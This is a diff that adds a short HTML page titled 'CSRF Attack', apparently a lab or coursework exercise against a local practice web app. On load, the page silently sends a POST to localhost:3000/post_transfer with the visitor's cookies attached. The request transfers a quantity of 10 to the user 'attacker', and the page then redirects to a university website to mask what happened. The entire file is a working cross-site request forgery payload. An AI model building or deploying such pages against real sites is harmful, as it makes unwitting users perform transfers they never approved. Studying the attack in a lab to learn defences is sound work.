@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body onload="submitForm()">
+    <script type="text/javascript">
+
+      async function submitForm() {
+        const formData =  new URLSearchParams({
+            destination_username: "attacker",
+            quantity: "10"
+        })
+            
+        const res=await fetch("http://localhost:3000/post_transfer", {
+            method: "POST",
+            body: formData,
+            credentials: "include"
+        });
+
+        if(res.ok){
+            window.location.replace("https://www.kw.ac.kr")
+        }
+
+    }
+        
+    </script>
+</body>
+</html>
